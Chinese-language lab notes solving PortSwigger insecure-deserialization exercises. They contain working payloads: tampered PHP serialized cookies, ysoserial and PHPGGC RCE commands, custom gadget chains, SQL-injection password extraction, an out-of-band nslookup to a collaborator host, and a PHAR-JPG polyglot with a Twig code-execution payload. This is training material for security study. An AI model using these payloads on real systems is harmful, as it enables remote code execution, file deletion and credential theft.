
## 操控序列化对象

### 修改对象属性

实验室：修改序列化对象
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects

登录后得到的cookie
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
使用url-base64解码后得到 PHP序列化格式
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

发送到重复器，在检查组件中编辑为
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
并应用更改

响应中包含管理员面板


### 修改数据类型

实验室：修改序列化数据类型
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

登录后得到的cookie
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJneHFjbXZiMmw4dXN1a2xrMXQyaWF1a3Nyamg2ajlydCI7fQ%3d%3d
使用 url-base64 解码后得到 PHP序列化格式
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"gxqcmvb2l8usuklk1t2iauksrjh6j9rt";}

修改为
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";b:1;}
响应包含管理员面板

示例解决方案：本来应当修改 access_token 的值为0，但在尝试中意外的作为 wiener 获得了管理员权限
> O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}


## 使用应用程序功能

实验：利用应用程序功能来利用不安全的反序列化
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization

登录后得到的cookie
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6InVnNzkyZmN6ZzNxbXV3NGJ5Mmo3cWlpNXJvZHUydDNlIjtzOjExOiJhdmF0YXJfbGluayI7czoxODoidXNlcnMvZ3JlZ2cvYXZhdGFyIjt9
使用 url-base64 解码后得到 PHP序列化格式
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ug792fczg3qmuw4by2j7qii5rodu2t3e";s:11:"avatar_link";s:18:"users/gregg/avatar";}

修改为
s:11:"avatar_link";s:23:"users/carlos/morale.txt"
失败

示例解决方案：
> s:11:"avatar_link";s:23:"/home/carlos/morale.txt"

## 魔法方法 & 注入任意对象

实验：PHP 中的任意对象注入
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

登录后得到的cookie
Cookie: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJrNHVyMjR6MzFmdzNxdDd1eXhuMWNvMmwzNTNxZ3YyNSI7fQ%3d%3d
使用 url-base64 解码后得到 PHP序列化格式
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"k4ur24z31fw3qt7uyxn1co2l353qgv25";}


在主页中发现注释
```html
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```

按照提示在文件名后加 ~ 尝试访问备份
GET /libs/CustomTemplate.php~ HTTP/2
得到源码代码备份
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
审查源代码，对象 CustomTemplate 的解构函数 __destruct 在销毁对象时，检查并删除 lock_file_path 字段
于是设置 CustomTemplate 对象的序列化字符串，设置字段 lock_file_path 为删除目标路径
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

## 工具链
### 使用预构建的 gadget 链

#### ysoserial
实验：利用 Apache Commons 进行 Java 反序列化
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons

登录后得到的cookie
Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACByNDI5dTEyNmtrczkzOHlnYnJnZG8waXA1OW95b3pqZXQABndpZW5lcg%3d%3d
使用 url-base64 解码后得到部分内容，存在无法打印的打印字符

构建工具使用命令
载荷为 CommonsCollections4
命令为"rm /home/carlos/morale.txt"
转换为Base64编码 ForEach-Object { [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_)) }
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | ForEach-Object { [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_)) }
然而似乎是运行错误而不是生成了攻击向量

在linux虚拟机上安装java8，将工具放在用户根目录
输入命令
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
输出包含回车换行
再转换为url后，作为cookie值发送
返回500，显示通过lab

或使用 base64 -w 0 将输出合为一行
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0


#### PHP 通用漏洞利用链
实验：利用预构建的 gadget 链进行 PHP 反序列化
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain

发现内容
GET /cgi-bin/phpinfo.php HTTP/2
其中
SECRET_KEY 	1vkhn7wfm4jfw47ojde93dmxjmzijxwf

登录后得到cookie
Cookie: session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2ZmpzNGVzaXZ2bm5zMWhjbTk4enl4YmZtMGl6ZG8wMyI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%225dd18f8388f8ecf4806ca2cac49f946a40aa36d4%22%7D
使用 url 解码后得到
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ2ZmpzNGVzaXZ2bm5zMWhjbTk4enl4YmZtMGl6ZG8wMyI7fQ==","sig_hmac_sha1":"5dd18f8388f8ecf4806ca2cac49f946a40aa36d4"}

在linux虚拟机中放入PHPGGC工具

示例解决方案：
生成的错误消息揭示应用程序使用 Symfony 框架
```html
<h4>Internal Server Error: Symfony Version: 4.3.6</h4>
```

对url解码后的令牌进行base64解码得到
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vfjs4esivvnns1hcm98zyxbfm0izdo03";}

./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
> 并使用你之前获取的密钥正确地对其进行签名
```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```
在识别到 token 的值为序列化php对象后，此处即为反序列化注入点。
使用泄露的服务器端秘密字符串对攻击向量进行hash生成mac令牌，确保攻击向量作为有效值被反序列化来通过检测

### !!处理已文档化的 gadget 链
实验：利用已记录的 gadget 链进行 Ruby 反序列化 | Web 安全学院
https://portswigger.net/academy/labs/launch/c911d0a4c35afb75a94e7710baa76c14054cc1bc85b79632e70e049ed992fc02?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain


登录后得到cookie
Cookie: session=BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVnd2V0eTB2bHM5NHNrb2tlNWh2YmRrbWNqdXBpNmcyMwY7B0YK
使用 Base64 解码后得到部分内容，存在无法打印的打印字符

测试过程中的报错，泄露的路径显示了版本
/usr/lib/ruby/2.7.0/rubygems

format version 4.8 required;
Marshal 序列化格式的版本号

安装对应版本的ruby：
安装编译 Ruby 所需的开发工具和库
sudo apt update
sudo apt install -y autoconf bison build-essential libssl-dev libyaml-dev libreadline-dev zlib1g-dev libncurses5-dev libffi-dev libgdbm-dev libgdbm-compat-dev

Ruby 2.7.0 需要特定版本的 OpenSSL 库支持
sudo apt-add-repository -y ppa:rael-gc/rvm
sudo apt update
sudo apt install -y libssl1.0-dev

设置编译选项
export RUBY_CONFIGURE_OPTS="--with-openssl-dir=/usr/include/openssl --disable-install-doc"

rbenv install 2.7.0

浏览已知工具链
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
修改执行的代码

## 创建自己的漏洞利用工具

实验：为 Java 反序列化开发自定义 gadget 链
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization

在主题的开发者注释中存在信息泄露
```html
<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
```
内容为用户对象，包含用户名与令牌
```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

继续探索
GET /backup HTTP/2
发现另一个代码文件
/backup/ProductTemplate.java
内容为商品对象，包含商品id与从数据库查询得到的信息
```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```
商品信息查询中
private void readObject(ObjectInputStream inputStream)

jvm反序列化：首先创建对象实例，然后检查是否存在自定义的readObject方法
如果存在自定义readObject方法，JVM会通过反射调用该方法，而不会调用默认的反序列化逻辑

商品对象的id字段在sql查询的上下文中
尝试创建商品对象设置id进行sql注入

那么：
使用商品对象时，反序列化拥有可调用方法
此方法可进行数据库查询
而序列化点在登录的cookie


```sql
SELECT * FROM products WHERE id = '%s' LIMIT 1
```
若报错，为
java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser

已知商品ID为 PROD1
探测当前查询的列数
' ORDER BY 1--
递增数字后8标准报错，9时SQL报错
测试列数为8
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT 'a','a',NULL,NULL,NULL,NULL,NULL,NULL--
1-3为字符类型，无返回内容，仅为类型不匹配
4为数字类型，返回输入的字符串

' UNION SELECT TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)


' UNION SELECT CAST((SELECT TABLE_NAME FROM information_schema.tables LIMIT 1) AS int),NULL,NULL,NULL,NULL,NULL,NULL,NULL--
仅返回类型不匹配，错误无法直接返回内容

; copy (SELECT '') to program 'nslookup ffyl9t596rujifzqfn1xmxobl2rtfj38.oastify.com'--
权限不足


进行sql注入探查

' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users--
确认存在表users
' UNION SELECT username,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users LIMIT 1--
确认表users中的列存在username

' UNION SELECT accessToken,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users LIMIT 1--
列名不为 accessToken
' UNION SELECT password,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users LIMIT 1--
存在列 password
' UNION SELECT password,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users WHERE username='administrator'--
无报错

密码查询在第一列的字符类型，从字符串转为数字，但报错仍只有类型不匹配
' UNION SELECT CAST((SELECT password FROM users WHERE username='administrator') AS int),NULL,NULL,NULL,NULL,NULL,NULL,NULL--
java.io.IOException: org.postgresql.util.PSQLException: ERROR: UNION types character varying and integer cannot be matched

密码查询在第四列的数字类型，不转换，报错仅为类型不匹配
' UNION SELECT NULL,NULL,NULL,(SELECT password FROM users WHERE username='administrator'),NULL,NULL,NULL,NULL--

示例解决方案，密码查询在第四列的数字类型，并转字符串为数字，此时报错返回查询信息
> ' UNION SELECT NULL,NULL,NULL,CAST((SELECT password FROM users WHERE username='administrator') AS int),NULL,NULL,NULL,NULL--
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;vwuccoazat55ysg8fw62&quot;
**前两种在数据库的列类型检查时发现不匹配则立即返回普通类型错误。而第三种预期类型匹配，在实际转换时发生类型后返回详细信息。**



实验：为 PHP 反序列化开发自定义 gadget 链
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization

在主页中发现注释
```html
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
```
使用提示
> 有时可以通过在文件名后附加波浪号（~）来获取编辑器生成的备份文件，从而读取源代码。

GET /cgi-bin/libs/CustomTemplate.php~ HTTP/2
内容为
```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    // 默认参数值为字符串
    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    // 序列化魔术方法
    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    // 1. 反序列化魔术方法，起点
    public function __wakeup() {
        $this->build_product();
    }

    // 2. 反序列化后使用 default_desc_type 与 desc 字段构建 Product 对象
    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

// 3. 设置字段为某对象的字段，若字段不存在则使用 __get()魔术方法。
// DefaultMap 对象恰好拥有__get()魔术方法
// DefaultMap.__get(default_desc_type)
class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

// 无参数创建时初始化两个字段，其中一个拥有HTML标记
class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

// 1.1 传入参数，在魔术方法被调用时作为其他函数的参数
// desc.__get(default_desc_type)
// name = default_desc_type
class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

登录后获得的cookie为序列化
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fwaxxoknfzfe9eyq0td2h21diibl2z3v";}
```php
<?php
$payload = new CustomTemplate();

eval("system('rm /home/carlos/morale.txt');");
exec("rm /home/carlos/morale.txt");
?>
```
O:14:"CustomTemplate":2:{s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"eval";};s:17:"default_desc_type";s:37:"system('rm /home/carlos/morale.txt');";}
失败，eval函数接收字符串后，字符串再被解析而调用system函数，system函数接收字符串后作为系统命令执行

> O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
成功，exec函数接收字符串后，作为系统命令执行

## PHAR 反序列化


https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

安装php时设置
phar.readonly = Off
将注释符号 ; 删除，设置readonly值为Off

1. 上传phar文件
2. 找到文件系统方法
3. 找到传递phar流的方式
2. 传递phar流到文件系统方法触发隐式反序列化

上传图像后读取头像的请求为
GET /cgi-bin/avatar.php?avatar=wiener HTTP/2

若尝试访问头像功能
GET /cgi-bin/avatar.php HTTP/2
得到路径
PHP Notice:  Undefined index: avatar in /home/carlos/cgi-bin/avatar.php on line 8

GET /cgi-bin/ HTTP/2
得到代码文件索引
```html
<a href='/cgi-bin/CustomTemplate.php'>CustomTemplate.php</a>
<a href='/cgi-bin/CustomTemplate.php~'>CustomTemplate.php~</a>
<a href='/cgi-bin/Blog.php'>Blog.php</a>
<a href='/cgi-bin/Blog.php~'>Blog.php~</a>
<a href='/cgi-bin/avatar.php'>avatar.php</a>
```

再次尝试访问头像功能，此时添加/到末尾
GET /cgi-bin/avatar.php/ HTTP/2
```php
<?php

require_once('CustomTemplate.php');
require_once('Blog.php');

// 切换当前目录到 /avatars
chdir('../avatars/');

// 从查询字符串参数avatar的值获取头像路径并拼接后缀
$avatar_file_path = $_GET['avatar'] . '.jpg';

// 使用 文件系统方法 file_exists 判断文件是否存在
if (file_exists($avatar_file_path)) {
    // 使用 strpos 函数对用户控制路径进行测试，失败时抛出异常回显路径
    // if (strpos($_GET['avatar'], "\\") !== false || strpos($_GET['avatar'], "/") !== false || strpos($_GET['avatar'], ".") !== false) {
    //     throw new Exception("File name is invalid: " . $avatar_file_path);
    // }
    // 头部固定设置为头像格式
    // header("content-type: image/jpeg");
    // readfile($avatar_file_path);
// } else {
//     header("Status: 404 Not Found");
//     echo "Not Found";
// }

?>
```
使用读取头像功能时可设置路径，可触发文件系统方法


访问当前客户模板代码文件或备份文件php~，内容相同
GET /cgi-bin/CustomTemplate.php/ HTTP/2
```php
<?php

class CustomTemplate {
    private $template_file_path;

    // public function __construct($template_file_path) {
    //     $this->template_file_path = $template_file_path;
    // }

    // private function isTemplateLocked() {
    //     return file_exists($this->lockFilePath());
    // }

    // public function getTemplate() {
    //     return file_get_contents($this->template_file_path);
    // }

    // public function saveTemplate($template) {
    //     if (!isTemplateLocked()) {
    //         if (file_put_contents($this->lockFilePath(), "") === false) {
    //             throw new Exception("Could not write to " . $this->lockFilePath());
    //         }
    //         if (file_put_contents($this->template_file_path, $template) === false) {
    //             throw new Exception("Could not write to " . $this->template_file_path);
    //         }
    //     }
    // }

    // 文件系统函数 @unlink() 用于删除文件
    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    // 字符串操作。似乎旧版本存在%00的路径截断，但新版本修复
    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```
客户文档对象中的解构函数可用来删除文件，
控制字段的 CustomTemplate.template_file_path 上下文为拼接路径，
前缀可使用路径遍历，但后缀是否可忽略


访问博客源代码文件或.php~备份文件，内容相同
发现 php-twig-1.19 模板引擎
GET /cgi-bin/Blog.php/ HTTP/2
```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    // public function __construct($user, $desc) {
    //     $this->user = $user;
    //     $this->desc = $desc;
    // }

    // 在字符串操作时，设置对模板字符串中设置的user变量进行，触发模板渲染
    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    // 反序列化时，从Blog.desc 以字符串的形式加载模板，此处即可控制模板字符串
    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    // public function __sleep() {
    //     return ["user", "desc"];
    // }
}

?>
```
博客对象使用twig模板，
Blog对象的字符串操作，Blog.user 可进行模板注入
Blog对象的反序列化，Blog.desc 加载控制模板内容

当前工具
1. 头像查询参数可设置phar://包装器
2. 客户对象存在字符串操作与删除功能
3. 博客对象存在反序列与字符串方法

构建路径
1. 使用客户对象，设置文件路径并尝试截断后缀，解构时即可触发删除
或
1. 使用博客对象，设置反序列化时的字段为模板注入载荷
2. 设置客户对象，设置文件路径为博客对象触发解构函数的字符串操作，从而执行模板注入载荷

```php
<?php
// 头像api为
// $avatar_file_path = $_GET['avatar'] . '.jpg';
// 设置查询参数值为 phar:// 包装器
// /cgi-bin/avatar.php?avatar=phar://wiener
// 此时上传名为 wiener.jpg的 phar流文件即可触发反序列化
?>
```

下载phar-jpg多语言工具
https://github.com/kunte0/phar-jpg-polyglot
设置载荷为
```php
class CustomTemplate {
    public $template_file_path;
    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
    }
}

class Blog {
    public $desc;
    public function __construct($desc) {
        $this->desc = $desc;
    }
}

$s1 = new Blog('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}');
$s2 = new CustomTemplate($s1);
$object = $s2;
```
即可得到绕过检测的文件
